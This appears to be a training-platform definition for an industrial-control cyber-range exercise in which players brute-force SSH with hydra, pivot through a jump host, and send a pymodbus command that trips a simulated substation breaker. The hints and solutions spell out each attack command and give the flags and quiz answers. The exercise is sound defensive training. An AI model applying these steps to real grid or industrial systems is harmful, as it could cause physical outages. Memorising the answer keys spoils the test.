@@ -1,0 +1,272 @@
+{
+  "title": "Operation Blackout Zero: Smart Grid Sabotage & Industrial Pivoting",
+  "description": "An immersive industrial cyber-range exercise inspired by real-world power grid cyberattacks (Ukraine 2015, Industroyer 2016, Industroyer2 2022). Operating as an adversary team targeting the Aegis Power & Light utility grid, you will pivot through Purdue Model network tiers (Level 4 Enterprise to Level 0 Physics), hijack SCADA control portals, and execute raw Modbus TCP command injection against substation PLCs to induce physical feeder collapse in a real-time GridLAB-D co-simulation engine.",
+  "prerequisites": [
+    "Familiarity with Linux command-line tools (ssh, nmap, python3)",
+    "Fundamental knowledge of TCP/IP networking, subnets, and SSH port forwarding",
+    "Understanding of the Purdue Enterprise Reference Architecture (PERA) for OT network zoning",
+    "Basic concepts of Industrial Control Systems (ICS) and Modbus TCP protocol (port 502)"
+  ],
+  "outcomes": [
+    "Infiltrate segregated OT network zones following Purdue Model / ISA IEC 62443 guidelines",
+    "Establish multi-hop SSH tunnels through an Industrial DMZ (IDMZ) jump host",
+    "Perform stealthy network discovery across SCADA control room and substation subnets",
+    "Inspect unauthenticated SCADA HMI web interfaces (Node-RED) and Grafana telemetry dashboards",
+    "Craft raw Modbus TCP payload frames (Write Single Coil 0x05) to disable physical circuit breakers",
+    "Analyze physical grid instability feedback loops in real-time co-simulation environments"
+  ],
+  "state": "RELEASED",
+  "show_stepper_bar": true,
+  "estimated_duration": 90,
+  "variant_sandboxes": false,
+  "levels": [
+    {
+      "title": "Overview: Operation Blackout Zero",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# Operation Blackout Zero: Smart Grid Sabotage & Industrial Pivoting\n\nWelcome to **Operation Blackout Zero**. In this cyber exercise, you assume the role of an elite adversary assessing the resilience of the **Aegis Power & Light** regional electrical distribution grid.\n\n### Historical Context: Cyberattacks on Electrical Grids\n\nThis exercise mimics key tactics, techniques, and procedures (TTPs) observed in high-profile real-world power grid intrusions:\n\n* **Ukraine 2015 Power Grid Attack (BlackEnergy 3 / Sandworm)**: Adversaries compromised corporate networks, pivoted through VPN jump hosts into SCADA control centers, and manually commanded substation circuit breakers open, plunging over 225,000 citizens into darkness.\n* **Ukraine 2016 Substation Blackout (Industroyer / CrashOverride)**: The first automated malware specifically designed to attack power grid substations via ICS protocols (IEC 60870-5-104, IEC 61850, Modbus TCP), opening transmission breakers automatically.\n* **Industroyer2 (2022)**: Targeted Ukrainian 110kV electrical substations using targeted ICS protocol payload injection.\n\n---\n\n### Purdue Model Network Architecture\n\n| Tier | Sandbox Host | IP Address | Network Subnet | Purdue Model Role |\n|:---:|---|---|---|---|\n| **Foothold** | `attacker-host` | `10.0.100.50` | `10.0.100.0/24` | Corporate Management / Red Team Workstation |\n| **Level 3.5** | `idmz-jump` | `10.0.50.50` | `10.0.50.0/24` | Industrial DMZ Secure Jump Host |\n| **Level 4** | `enterprise-host` | `10.0.1.10` | `10.0.1.0/24` | Enterprise Business Analytics |\n| **Level 3** | `scada-hmi` | `10.0.2.10` | `10.0.2.0/24` | SCADA Control Room (Node-RED, Grafana) |\n| **Level 3** | `engineering-station` | `10.0.2.20` | `10.0.2.0/24` | Engineering Workstation (EWS) |\n| **Level 2/1** | `substation-plc1` | `10.0.3.10` | `10.0.3.0/24` | Primary Substation OpenPLC Runtime |\n| **Level 2/1** | `substation-plc2` | `10.0.3.11` | `10.0.3.0/24` | Secondary Backup Substation PLC |\n| **Level 0** | `gridlabd-physics` | `10.0.4.10` | `10.0.4.0/24` | GridLAB-D IEEE 13-Node Physics Engine |\n\n---\n\n### Exercise Operational Outline\n\n1. **Foothold**: Initialize your terminal on the corporate Kali host.\n2. **Infiltrating the IDMZ**: Locate and gain access to the Industrial DMZ Jump Host.\n3. **SCADA Control Room Breach**: Pivot into the SCADA network and discover active HMI telemetry portals.\n4. **Substation Sabotage**: Transmit Modbus TCP commands to open feeder breakers and verify physical grid collapse.\n"
+    },
+    {
+      "title": "FOOTHOLD: Attacker Workstation Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 2,
+      "minimal_possible_solve_time": null,
+      "passkey": "gridlock_start",
+      "cloud_content": "### Mission Briefing\n\nYou have gained unauthorized access to an unmonitored terminal in the corporate management network (`attacker-host`). Log in with credentials `kali` / `kali` and enter the passkey **`gridlock_start`** to unlock the operation.",
+      "local_content": "Enter the passkey **`gridlock_start`** to unlock the operation."
+    },
+    {
+      "title": "IDMZ: Infiltrating the Industrial Perimeter",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": 2,
+      "answer": "FLAG{IDMZ_JUMP_PIVOT_ESTABLISHED}",
+      "content": "### Operational Situation\n\nThe perimeter gateway firewall (`purdue-gateway`) blocks direct routing from corporate IT subnets to the sensitive SCADA control room (`10.0.2.0/24`) and substation PLC networks (`10.0.3.0/24`). This enforces ISA/IEC 62443 zone segregation policies.\n\nHowever, a Level 3.5 Industrial DMZ (IDMZ) host (`idmz-jump`) is active on the `10.0.50.0/24` network to facilitate remote maintenance for external power engineers.\n\n### Your Objective\n\n1. Discover the active SSH service running on the IDMZ subnet.\n2. Obtain access to the account of user **`operator`** on the jump host.\n3. Connect via SSH to the jump host and locate the initial authorization flag stored in the operator's home directory.\n",
+      "solution": "1. Run SSH brute-force scan: `hydra -l operator -P passlist.txt ssh://10.0.50.50` (password: `operator123`).\n2. Connect: `ssh operator@10.0.50.50`\n3. Execute `cat /home/operator/flag.txt` to retrieve `FLAG{IDMZ_JUMP_PIVOT_ESTABLISHED}`.",
+      "max_score": 100,
+      "hints": [
+        {
+          "title": "Locating the IDMZ Jump Host",
+          "content": "Perform a target discovery or SSH scan against the IDMZ subnet (`10.0.50.0/24`) to confirm host availability on port 22.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Credential Recovery Tooling",
+          "content": "Execute `hydra -l operator -P /home/kali/passlist.txt ssh://10.0.50.50` on your Kali machine to identify the weak operator password (`operator123`).",
+          "hint_penalty": 15,
+          "order": 1
+        },
+        {
+          "title": "Flag Location",
+          "content": "After logging in via SSH, run `cat /home/operator/flag.txt`.",
+          "hint_penalty": 10,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "T0886"
+        },
+        {
+          "technique_key": "T0812"
+        }
+      ]
+    },
+    {
+      "title": "SCADA: Control Room Reconnaissance & HMI Discovery",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": 3,
+      "answer": "FLAG{SCADA_HMI_MONITORING_COMPROMISED}",
+      "content": "### Operational Situation\n\nHaving established a position inside the IDMZ jump host (`idmz-jump`), you now have network visibility into the Level 3 SCADA Control Room network (`10.0.2.0/24`).\n\nIn the **2015 Ukraine Power Grid attack**, threat actors leveraged compromised control room connections to view real-time HMI displays, observing grid operations before taking over human-machine interfaces.\n\n### Your Objective\n\n1. Scan the SCADA Control Room subnet (`10.0.2.0/24`) from `idmz-jump` to identify active web management interfaces.\n2. Establish a secure SSH tunnel from your Kali machine through the jump host to access the remote SCADA HMI web portal on your local machine.\n3. Access the SCADA HMI dashboard and extract the control room security flag.\n",
+      "solution": "1. Scan from jump host: `nmap -sV 10.0.2.0/24` (reveals `scada-hmi` at `10.0.2.10` with Node-RED on port 1880).\n2. Create SSH tunnel on Kali: `ssh -L 1880:10.0.2.10:1880 operator@10.0.50.50`\n3. Navigate to `http://localhost:1880` in browser or curl the endpoint to obtain `FLAG{SCADA_HMI_MONITORING_COMPROMISED}`.",
+      "max_score": 100,
+      "hints": [
+        {
+          "title": "Control Room Subnet Scanning",
+          "content": "Run `nmap -sV 10.0.2.0/24` from your `idmz-jump` terminal session to discover open ports on `scada-hmi` (`10.0.2.10`).",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "SSH Local Port Tunneling Syntax",
+          "content": "Execute `ssh -L 1880:10.0.2.10:1880 operator@10.0.50.50` on your Kali machine. This forwards `localhost:1880` on Kali through the IDMZ jump host to the Node-RED portal on `10.0.2.10`.",
+          "hint_penalty": 15,
+          "order": 1
+        },
+        {
+          "title": "Retrieving the Flag",
+          "content": "Open `http://localhost:1880` in your web browser, or execute `curl http://localhost:1880` to inspect the flow canvas telemetry flag.",
+          "hint_penalty": 10,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "T0884"
+        },
+        {
+          "technique_key": "T0886"
+        }
+      ]
+    },
+    {
+      "title": "SUBSTATION: Modbus TCP Command Injection & Physical Sabotage",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": 5,
+      "answer": "FLAG{GRID_PHYSICAL_COLLAPSE_SUCCESSFUL}",
+      "content": "### Operational Situation\n\nYou have reached the ultimate stage of Operation Blackout Zero. Level 2/1 Substation PLCs reside on `10.0.3.10` (`substation-plc1`) running OpenPLC V3. It exposes unauthenticated Modbus TCP on standard port 502.\n\nDirect connection from the corporate Kali machine (`10.0.100.50`) to `10.0.3.10` is blocked by the gateway firewall. You must pivot through your IDMZ SSH tunnel (`ssh -L 5020:10.0.3.10:502 operator@10.0.50.50`) or execute the command via Node-RED on `scada-hmi` (`10.0.2.10`).\n\nThis level mimics **Industroyer (2016)** and **Industroyer2 (2022)**, where malware transmitted unauthenticated protocol commands directly to substation controllers to trip high-voltage circuit breakers.\n\n### Substation Register Specification\n* **Coil 0 (`00001`)**: `CB_MAIN_CLOSED` (Main Feeder Breaker: `1` = Closed/Normal, `0` = Open/Tripped)\n* **Holding Register 2 (`40003`)**: `TAP_CHANGER_POS` (Regulator Tap Changer Position)\n\n### Your Objective\n\n1. Establish SSH port forwarding through `idmz-jump` (`ssh -L 5020:10.0.3.10:502 operator@10.0.50.50`), or execute the command via Node-RED on `scada-hmi`.\n2. Transmit a Modbus TCP payload targeting `substation-plc1` (`10.0.3.10:502`) to force Coil `0` (`CB_MAIN_CLOSED`) to `False` (`0`).\n3. The OpenPLC runtime will process the coil modification and send the breaker trip signal to the Level 0 GridLAB-D co-simulation engine.\n4. Observe physical bus voltage collapse to `0.0V` and retrieve the physical grid collapse flag generated by the physics bridge.\n",
+      "solution": "Option A (SSH Port Forwarding):\n1. Establish SSH tunnel on Kali: `ssh -L 5020:10.0.3.10:502 operator@10.0.50.50`\n2. Run attack script targeting local tunnel port: `python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action trip_breaker`\n3. Verify voltage collapse: `python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action read` to retrieve `FLAG{GRID_PHYSICAL_COLLAPSE_SUCCESSFUL}`.\n\nOption B (Node-RED RCE on SCADA HMI):\n1. Use an Exec node on `http://localhost:1880` to run:\n   `python3 -c \"from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('10.0.3.10', port=502); c.connect(); c.write_coil(0, False); c.close()\"`",
+      "max_score": 100,
+      "hints": [
+        {
+          "title": "Pivoting & Target Port Tunneling",
+          "content": "Direct access to 10.0.3.10 is blocked from corporate subnets. Forward port 502 via SSH through idmz-jump: `ssh -L 5020:10.0.3.10:502 operator@10.0.50.50`",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Automated Modbus Attack via Tunnel",
+          "content": "Run `python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action trip_breaker` on your Kali machine.",
+          "hint_penalty": 15,
+          "order": 1
+        },
+        {
+          "title": "Reading Physics Collapse Flag",
+          "content": "Execute `python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action read` to view the collapsed grid state and retrieve the flag.",
+          "hint_penalty": 20,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "T0855"
+        },
+        {
+          "technique_key": "T0831"
+        }
+      ]
+    },
+    {
+      "title": "Knowledge Assessment",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "Which Purdue Model level contains the physical co-simulation physics engine (GridLAB-D)?",
+          "points": 100,
+          "penalty": 20,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "Level 0 (Physical Process)",
+              "correct": true,
+              "order": 0
+            },
+            {
+              "text": "Level 1 (Direct Control)",
+              "correct": false,
+              "order": 1
+            },
+            {
+              "text": "Level 2 (Area Control)",
+              "correct": false,
+              "order": 2
+            },
+            {
+              "text": "Level 3 (Operations Management)",
+              "correct": false,
+              "order": 3
+            }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "What is the standard TCP port used for unencrypted Modbus communication?",
+          "points": 100,
+          "penalty": 20,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "22",
+              "correct": false,
+              "order": 0
+            },
+            {
+              "text": "80",
+              "correct": false,
+              "order": 1
+            },
+            {
+              "text": "502",
+              "correct": true,
+              "order": 2
+            },
+            {
+              "text": "1880",
+              "correct": false,
+              "order": 3
+            }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Which historical cyberattack campaign targeted Ukrainian electrical substations in 2016 using automated ICS protocol payloads?",
+          "points": 100,
+          "penalty": 20,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "BlackEnergy 3",
+              "correct": false,
+              "order": 0
+            },
+            {
+              "text": "Industroyer (CrashOverride)",
+              "correct": true,
+              "order": 1
+            },
+            {
+              "text": "Stuxnet",
+              "correct": false,
+              "order": 2
+            },
+            {
+              "text": "Triton (TRISIS)",
+              "correct": false,
+              "order": 3
+            }
+          ]
+        }
+      ],
+      "instructions": "Test your understanding of the Purdue Model levels, OT protocols, and historical cyberattack taxonomy covered in Operation Blackout Zero.",
+      "assessment_type": "TEST"
+    }
+  ]
+}
